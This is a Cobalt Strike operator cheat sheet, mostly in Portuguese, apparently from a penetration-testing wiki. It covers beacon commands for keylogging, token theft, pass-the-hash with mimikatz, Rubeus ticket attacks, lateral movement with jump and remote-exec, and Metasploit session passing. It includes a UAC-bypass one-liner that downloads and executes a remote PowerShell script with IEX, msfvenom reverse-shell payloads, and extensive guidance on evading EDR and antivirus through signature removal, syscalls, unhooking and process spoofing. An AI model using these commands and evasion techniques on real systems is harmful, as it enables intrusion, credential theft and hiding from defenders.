# Cobalt Strike

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` então você pode selecionar onde escutar, que tipo de beacon usar (http, dns, smb...) e mais.

### Peer2Peer Listeners

Os beacons desses listeners não precisam se comunicar diretamente com o C2, eles podem se comunicar através de outros beacons.

`Cobalt Strike -> Listeners -> Add/Edit` então você precisa selecionar os beacons TCP ou SMB

* O **beacon TCP irá configurar um listener na porta selecionada**. Para se conectar a um beacon TCP, use o comando `connect <ip> <port>` de outro beacon
* O **beacon smb irá escutar em um pipename com o nome selecionado**. Para se conectar a um beacon SMB, você precisa usar o comando `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** para arquivos HTA
* **`MS Office Macro`** para um documento do office com uma macro
* **`Windows Executable`** para um .exe, .dll ou serviço .exe
* **`Windows Executable (S)`** para um **stageless** .exe, .dll ou serviço .exe (melhor stageless do que staged, menos IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Isso irá gerar um script/executável para baixar o beacon do cobalt strike em formatos como: bitsadmin, exe, powershell e python

#### Host Payloads

Se você já tem o arquivo que deseja hospedar em um servidor web, basta ir em `Attacks -> Web Drive-by -> Host File` e selecionar o arquivo para hospedar e a configuração do servidor web.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note que para carregar assemblies maiores que 1MB, a propriedade 'tasks_max_size' do perfil maleável precisa ser modificada.

# Screenshots
printscreen    # Tire uma única captura de tela via método PrintScr
screenshot     # Tire uma única captura de tela
screenwatch    # Tire capturas de tela periódicas da área de trabalho
## Vá para View -> Screenshots para vê-las

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes para ver as teclas pressionadas

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Injete a ação de portscan dentro de outro processo
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Importar módulo Powershell
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <apenas escreva o cmd powershell aqui> # Isso usa a versão mais alta do powershell suportada (não oppsec)
powerpick <cmdlet> <args> # Isso cria um processo sacrificial especificado por spawnto, e injeta UnmanagedPowerShell nele para melhor opsec (sem registro)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # Isso injeta UnmanagedPowerShell no processo especificado para executar o cmdlet PowerShell.


# User impersonation
## Geração de token com credenciais
make_token [DOMAIN\user] [password] #Crie um token para se passar por um usuário na rede
ls \\computer_name\c$ # Tente usar o token gerado para acessar C$ em um computador
rev2self # Pare de usar o token gerado com make_token
## O uso de make_token gera o evento 4624: Uma conta foi logada com sucesso. Este evento é muito comum em um domínio Windows, mas pode ser restringido filtrando pelo Tipo de Logon. Como mencionado acima, ele usa LOGON32_LOGON_NEW_CREDENTIALS que é do tipo 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Roubar token de pid
## Como make_token, mas roubando o token de um processo
steal_token [pid] # Além disso, isso é útil para ações de rede, não ações locais
## Da documentação da API sabemos que este tipo de logon "permite que o chamador clone seu token atual". É por isso que a saída do Beacon diz Impersonated <current_username> - está se passando pelo nosso próprio token clonado.
ls \\computer_name\c$ # Tente usar o token gerado para acessar C$ em um computador
rev2self # Pare de usar o token de steal_token

## Lançar processo com novas credenciais
spawnas [domain\username] [password] [listener] #Faça isso a partir de um diretório com acesso de leitura como: cd C:\
## Como make_token, isso gerará o evento Windows 4624: Uma conta foi logada com sucesso, mas com um tipo de logon de 2 (LOGON32_LOGON_INTERACTIVE). Ele detalhará o usuário chamador (TargetUserName) e o usuário impersonado (TargetOutboundUserName).

## Injete no processo
inject [pid] [x64|x86] [listener]
## Do ponto de vista de OpSec: Não realize injeção entre plataformas a menos que realmente precise (por exemplo, x86 -> x64 ou x64 -> x86).

## Pass the hash
## Este processo de modificação requer patching da memória do LSASS, o que é uma ação de alto risco, requer privilégios de administrador local e não é muito viável se o Protected Process Light (PPL) estiver habilitado.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash através do mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Sem /run, o mimikatz gera um cmd.exe, se você estiver executando como um usuário com Desktop, ele verá o shell (se você estiver executando como SYSTEM, você está livre para prosseguir)
steal_token <pid> #Roubar token do processo criado pelo mimikatz

## Pass the ticket
## Solicitar um ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Crie uma nova sessão de logon para usar com o novo ticket (para não sobrescrever o comprometido)
make_token <domain>\<username> DummyPass
## Escreva o ticket na máquina do atacante a partir de uma sessão poweshell & carregue-o
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket do SYSTEM
## Gere um novo processo com o ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Roube o token desse processo
steal_token <pid>

## Extrair ticket + Pass the ticket
### Listar tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump insteresting ticket by luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Crie uma nova sessão de logon, anote luid e processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insira o ticket na sessão de logon gerada
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finalmente, roube o token desse novo processo
steal_token <pid>

# Lateral Movement
## Se um token foi criado, ele será usado
jump [method] [target] [listener]
## Métodos:
## psexec                    x86   Use um serviço para executar um artefato Service EXE
## psexec64                  x64   Use um serviço para executar um artefato Service EXE
## psexec_psh                x86   Use um serviço para executar um one-liner PowerShell
## winrm                     x86   Execute um script PowerShell via WinRM
## winrm64                   x64   Execute um script PowerShell via WinRM
## wmi_msbuild               x64   movimento lateral wmi com tarefa inline c# msbuild (oppsec)


remote-exec [method] [target] [command] # remote-exec não retorna saída
## Métodos:
## psexec                          Execução remota via Service Control Manager
## winrm                           Execução remota via WinRM (PowerShell)
## wmi                             Execução remota via WMI

## Para executar um beacon com wmi (não está no comando jump) basta fazer upload do beacon e executá-lo
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## No host do metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## No cobalt: Listeners > Add e defina o Payload para Foreign HTTP. Defina o Host para 10.10.5.120, a Porta para 8080 e clique em Salvar.
beacon> spawn metasploit
## Você só pode gerar sessões x86 Meterpreter com o listener estrangeiro.

# Pass session to Metasploit - Through shellcode injection
## No host do metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Execute msfvenom e prepare o listener multi/handler

## Copie o arquivo bin para o host do cobalt strike
ps
shinject <pid> x64 C:\Payloads\msf.bin #Injete shellcode do metasploit em um processo x64

# Pass metasploit session to cobalt strike
## Gere shellcode Beacon stageless, vá para Attacks > Packages > Windows Executable (S), selecione o listener desejado, selecione Raw como o tipo de saída e selecione Use x64 payload.
## Use post/windows/manage/shellcode_inject no metasploit para injetar o shellcode gerado do cobalt strike


# Pivoting
## Abra um proxy socks no teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Execute-Assembly

O **`execute-assembly`** usa um **processo sacrificial** utilizando injeção de processo remoto para executar o programa indicado. Isso é muito barulhento, pois para injetar dentro de um processo, certas APIs do Win são usadas que todos os EDR estão verificando. No entanto, existem algumas ferramentas personalizadas que podem ser usadas para carregar algo no mesmo processo:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- No Cobalt Strike, você também pode usar BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

O script agressor `https://github.com/outflanknl/HelpColor` criará o comando `helpx` no Cobalt Strike, que colocará cores nos comandos indicando se são BOFs (verde), se são Frok&Run (amarelo) e similares, ou se são ProcessExecution, injeção ou similares (vermelho). O que ajuda a saber quais comandos são mais furtivos.

### Act as the user

Você pode verificar eventos como `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Verifique todos os logons interativos para saber os horários de operação habituais.
- System EID 12,13 - Verifique a frequência de desligamento/início/suspensão.
- Security EID 4624/4625 - Verifique tentativas NTLM válidas/inválidas de entrada.
- Security EID 4648 - Este evento é criado quando credenciais em texto simples são usadas para logon. Se um processo o gerou, o binário potencialmente tem as credenciais em texto claro em um arquivo de configuração ou dentro do código.

Ao usar `jump` do cobalt strike, é melhor usar o método `wmi_msbuild` para fazer o novo processo parecer mais legítimo.

### Use computer accounts

É comum que os defensores estejam verificando comportamentos estranhos gerados por usuários e **excluam contas de serviço e contas de computador como `*$` de sua monitoração**. Você pode usar essas contas para realizar movimento lateral ou escalonamento de privilégios.

### Use stageless payloads

Payloads stageless são menos barulhentos do que os staged porque não precisam baixar um segundo estágio do servidor C2. Isso significa que eles não geram tráfego de rede após a conexão inicial, tornando-os menos propensos a serem detectados por defesas baseadas em rede.

### Tokens & Token Store

Tenha cuidado ao roubar ou gerar tokens, pois pode ser possível para um EDR enumerar todos os tokens de todas as threads e encontrar um **token pertencente a um usuário diferente** ou até mesmo SYSTEM no processo.

Isso permite armazenar tokens **por beacon** para que não seja necessário roubar o mesmo token repetidamente. Isso é útil para movimento lateral ou quando você precisa usar um token roubado várias vezes:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Ao se mover lateralmente, geralmente é melhor **roubar um token do que gerar um novo** ou realizar um ataque pass the hash.

### Guardrails

O Cobalt Strike tem um recurso chamado **Guardrails** que ajuda a prevenir o uso de certos comandos ou ações que poderiam ser detectados pelos defensores. Os Guardrails podem ser configurados para bloquear comandos específicos, como `make_token`, `jump`, `remote-exec`, e outros que são comumente usados para movimento lateral ou escalonamento de privilégios.

Além disso, o repositório [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) também contém algumas verificações e ideias que você pode considerar antes de executar um payload.

### Tickets encryption

Em um AD, tenha cuidado com a criptografia dos tickets. Por padrão, algumas ferramentas usarão criptografia RC4 para tickets Kerberos, que é menos segura do que a criptografia AES e, por padrão, ambientes atualizados usarão AES. Isso pode ser detectado por defensores que estão monitorando algoritmos de criptografia fracos.

### Avoid Defaults

Ao usar Cobalt Strike, por padrão, os pipes SMB terão o nome `msagent_####` e `"status_####`. Mude esses nomes. É possível verificar os nomes dos pipes existentes do Cobalt Strike com o comando: `ls \\.\pipe\`

Além disso, com sessões SSH, um pipe chamado `\\.\pipe\postex_ssh_####` é criado. Mude-o com `set ssh_pipename "<new_name>";`.

Além disso, no ataque de exploração pós-exploração, os pipes `\\.\pipe\postex_####` podem ser modificados com `set pipename "<new_name>"`.

Nos perfis do Cobalt Strike, você também pode modificar coisas como:

- Evitar usar `rwx`
- Como o comportamento de injeção de processo funciona (quais APIs serão usadas) no bloco `process-inject {...}`
- Como o "fork and run" funciona no bloco `post-ex {…}`
- O tempo de espera
- O tamanho máximo de binários a serem carregados na memória
- A pegada de memória e o conteúdo DLL com o bloco `stage {...}`
- O tráfego de rede

### Bypass memory scanning

Alguns EDRs escaneiam a memória em busca de algumas assinaturas de malware conhecidas. O Cobalt Strike permite modificar a função `sleep_mask` como um BOF que será capaz de criptografar na memória o backdoor.

### Noisy proc injections

Ao injetar código em um processo, isso geralmente é muito barulhento, pois **nenhum processo regular geralmente realiza essa ação e porque as maneiras de fazer isso são muito limitadas**. Portanto, pode ser detectado por sistemas de detecção baseados em comportamento. Além disso, também pode ser detectado por EDRs que escaneiam a rede em busca de **threads contendo código que não está no disco** (embora processos como navegadores usando JIT tenham isso comumente). Exemplo: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Ao gerar um novo processo, é importante **manter uma relação pai-filho regular** entre os processos para evitar detecção. Se svchost.exec estiver executando iexplorer.exe, parecerá suspeito, pois svchost.exe não é um pai de iexplorer.exe em um ambiente Windows normal.

Quando um novo beacon é gerado no Cobalt Strike, por padrão, um processo usando **`rundll32.exe`** é criado para executar o novo listener. Isso não é muito furtivo e pode ser facilmente detectado por EDRs. Além disso, `rundll32.exe` é executado sem argumentos, tornando-o ainda mais suspeito.

Com o seguinte comando do Cobalt Strike, você pode especificar um processo diferente para gerar o novo beacon, tornando-o menos detectável:
```bash
spawnto x86 svchost.exe
```
Você também pode alterar esta configuração **`spawnto_x86` e `spawnto_x64`** em um perfil.

### Proxying attackers traffic

Os atacantes às vezes precisarão ser capazes de executar ferramentas localmente, mesmo em máquinas Linux, e fazer com que o tráfego das vítimas chegue à ferramenta (por exemplo, NTLM relay).

Além disso, às vezes, para realizar um ataque pass-the-hash ou pass-the-ticket, é mais discreto para o atacante **adicionar esse hash ou ticket em seu próprio processo LSASS** localmente e, em seguida, pivotar a partir dele em vez de modificar um processo LSASS de uma máquina vítima.

No entanto, você precisa ter **cuidado com o tráfego gerado**, pois pode estar enviando tráfego incomum (kerberos?) do seu processo de backdoor. Para isso, você poderia pivotar para um processo de navegador (embora você possa ser pego se injetar em um processo, então pense em uma maneira discreta de fazer isso).
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> Mudar senha  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Mudar powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Mudar $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#kit de artefato  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
